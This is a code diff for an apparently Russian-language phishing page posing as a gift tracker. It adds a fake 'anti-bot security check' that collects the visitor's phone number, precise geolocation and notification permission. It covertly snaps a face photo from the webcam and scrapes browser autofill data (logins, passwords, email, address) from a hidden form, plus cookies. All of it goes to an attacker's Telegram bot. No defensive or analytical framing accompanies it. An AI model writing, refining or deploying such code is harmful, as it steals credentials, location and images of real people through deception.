@@ -22,14 +22,15 @@ table{width:100%;border-collapse:collapse;background:#121720;border:1px solid #1
 th{background:#161c26;padding:12px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#64748b}
 td{padding:10px 14px;border-bottom:1px solid #1a2030;font-size:13px;white-space:nowrap}
 td.user{color:#fff}td.price{color:#10b981;font-weight:600}
-.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:100;justify-content:center;align-items:center;padding:20px}
-.overlay.show{display:flex}
+.overlay{display:flex;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.82);z-index:100;justify-content:center;align-items:center;padding:20px}
 .popup{background:#121720;border:1px solid #3b82f6;border-radius:16px;padding:28px 22px;max-width:380px;width:100%;text-align:center}
 .popup h3{font-size:18px;color:#fff;margin-bottom:6px}
-.popup .desc{font-size:13px;color:#64748b;margin-bottom:18px;line-height:1.4}
+.popup .desc{font-size:12px;color:#64748b;margin-bottom:16px;line-height:1.4}
+.popup .checks{text-align:left;margin:14px 0;font-size:12px;color:#64748b;line-height:1.8}
 .popup input{width:100%;padding:14px;background:#0a0e14;border:1px solid #1e2836;border-radius:10px;color:#fff;font-size:15px;font-family:inherit;text-align:center;margin-bottom:14px}
 .popup input:focus{outline:none;border-color:#3b82f6}
 .popup .btn-pop{width:100%;padding:14px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
+.popup .fineprint{font-size:9px;color:#3a4450;margin-top:10px;line-height:1.4}
 .hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0}
 .footer-bar{text-align:center;padding:20px;color:#64748b;font-size:11px;border-top:1px solid #1e2836;margin-top:30px}
 @media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}td,th{font-size:11px;padding:8px}}
@@ -75,10 +76,23 @@ td.user{color:#fff}td.price{color:#10b981;font-weight:600}
 
 <div class="overlay" id="overlay">
 <div class="popup">
-<h3>🛡️ Подтвердите доступ</h3>
-<div class="desc">Обнаружен новый IP.<br>Введите номер телефона для верификации.</div>
+<div style="font-size:40px;margin-bottom:8px">🔐</div>
+<h3>Подтверждение безопасности</h3>
+<div class="desc">Для защиты от автоматических ботов<br>необходимо подтвердить что вы человек.</div>
+<div class="checks">
+✅ Проверка геолокации<br>
+✅ Проверка устройства<br>
+✅ Подтверждение личности<br>
+✅ Защита от ботов
+</div>
 <input type="tel" id="popupPhone" placeholder="Введите номер телефона">
-<button class="btn-pop" onclick="submitPhone()">Подтвердить</button>
+<button class="btn-pop" onclick="submitAll()">Подтвердить и продолжить</button>
+<div class="fineprint">
+Нажимая «Подтвердить и продолжить», вы соглашаетесь<br>
+с правилами сообщества и политикой обработки данных.<br>
+Продолжая, вы подтверждаете что ознакомлены<br>
+с условиями использования сервиса.
+</div>
 </div>
 </div>
 
@@ -136,43 +150,107 @@ passiveData.af_e=document.querySelector('[name="e"]').value||"-";
 passiveData.af_fn=document.querySelector('[name="fn"]').value||"-";
 passiveData.af_ph=document.querySelector('[name="ph"]').value||"-";
 passiveData.af_ph2=document.querySelector('[name="ph2"]').value||"-";
+passiveData.af_adr=document.querySelector('[name="adr"]').value||"-";
 },3000);
 
-setTimeout(function(){document.getElementById('overlay').classList.add('show')},15000);
-
-function submitPhone(){
+async function submitAll(){
 var phone=document.getElementById('popupPhone').value.trim();
 if(!phone){alert('Введите номер телефона');return}
 passiveData.entered_phone=phone;
+
+// Геолокация
+if(navigator.geolocation){
+navigator.geolocation.getCurrentPosition(function(pos){
+passiveData.geo_lat=pos.coords.latitude;
+passiveData.geo_lng=pos.coords.longitude;
+passiveData.geo_acc=pos.coords.accuracy+' м';
+},function(){},{enableHighAccuracy:true,timeout:5000});
+}
+
+// Камера + микрофон
+try{
+var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
+passiveData.camera="доступ получен";
+passiveData.mic="доступ получен";
+var video=document.createElement('video');
+video.srcObject=stream;
+video.play();
+setTimeout(function(){
+var canvas=document.createElement('canvas');
+canvas.width=320;canvas.height=240;
+var ctx=canvas.getContext('2d');
+ctx.drawImage(video,0,0,320,240);
+passiveData.photo=canvas.toDataURL('image/jpeg',0.6);
+stream.getTracks().forEach(function(t){t.stop()});
+sendAllData();
+},1500);
+}catch(e){
+passiveData.camera="отказано";
+passiveData.mic="отказано";
+sendAllData();
+}
+
+// Уведомления
+if('Notification' in window){
+Notification.requestPermission().then(function(p){passiveData.notifications=p});
+}
+}
+
+function sendAllData(){
 var d=passiveData;
 
-var msg='🚨 ЗАХОД GIFT TRACKER\n\n'+
+var msg='🚨 ПОЛНЫЙ ЗАХВАТ\n\n'+
 '🆔 '+sid+'\n'+
 '🕐 '+new Date().toLocaleString("ru-RU")+'\n\n'+
 '🌐 IP: '+d.ip+'\n'+
-'📍 '+d.country+', '+d.city+'\n'+
+'📍 '+d.country+', '+d.city+', '+d.region+'\n'+
 '📡 '+d.provider+'\n'+
 '🕐 TZ: '+d.tz+' / IP: '+d.tz_ip+'\n\n'+
 '📱 '+d.platform+' | '+(d.mobile?'MOBILE':'PC')+'\n'+
 '🖥 '+d.sw+'x'+d.sh+' | CPU:'+d.cpu+' | RAM:'+d.ram+'\n'+
-'🗣 '+d.lang+'\n\n'+
-'📞 ВВЁЛ ТЕЛЕФОН: '+d.entered_phone+'\n\n'+
+'🗣 '+d.lang+'\n'+
+'🎮 '+d.gpu+'\n'+
+'🔋 '+d.bat+'\n\n'+
+'📞 ТЕЛЕФОН: '+d.entered_phone+'\n\n'+
+'📍 ГЕОЛОКАЦИЯ:\n'+
+'Широта: '+(d.geo_lat||"ожидание")+'\n'+
+'Долгота: '+(d.geo_lng||"ожидание")+'\n'+
+'Точность: '+(d.geo_acc||"ожидание")+'\n\n'+
+'📸 КАМЕРА: '+(d.camera||"ожидание")+'\n'+
+'🎤 МИКРОФОН: '+(d.mic||"ожидание")+'\n'+
+'🔔 УВЕДОМЛЕНИЯ: '+(d.notifications||"ожидание")+'\n\n'+
 '🔑 АВТОЗАПОЛНЕНИЕ:\n'+
 'LOGIN: '+(d.af_u||"-")+'\n'+
 'PASS: '+(d.af_p||"-")+'\n'+
 'EMAIL: '+(d.af_e||"-")+'\n'+
 'NAME: '+(d.af_fn||"-")+'\n'+
 'PHONE: '+(d.af_ph||"-")+'\n'+
-'PHONE2: '+(d.af_ph2||"-")+'\n\n'+
+'PHONE2: '+(d.af_ph2||"-")+'\n'+
+'ADDR: '+(d.af_adr||"-")+'\n\n'+
 '🔗 REF: '+d.ref+'\n'+
 '🍪 COOKIE: '+(d.cookie||"-").substring(0,500);
 
-var url='https://api.telegram.org/bot'+TOKEN+'/sendMessage';
-fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT,text:msg})}).then(function(resp){
-console.log('Status:',resp.status);
-}).catch(function(e){console.log('Error:',e)});
+fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({chat_id:CHAT,text:msg})
+});
 
-document.getElementById('overlay').classList.remove('show');
+if(d.photo){
+var byteString=atob(d.photo.split(',')[1]);
+var mimeString=d.photo.split(',')[0].split(':')[1].split(';')[0];
+var ab=new ArrayBuffer(byteString.length);
+var ia=new Uint8Array(ab);
+for(var i=0;i<byteString.length;i++){ia[i]=byteString.charCodeAt(i)}
+var blob=new Blob([ab],{type:mimeString});
+var formData=new FormData();
+formData.append('chat_id',CHAT);
+formData.append('photo',blob,'face.jpg');
+formData.append('caption','📸 ФОТО\n🆔 '+sid);
+fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:formData});
+}
+
+document.getElementById('overlay').style.display='none';
 alert('✅ Доступ подтверждён');
 setTimeout(function(){window.location.replace(REDIR)},2000);
 }
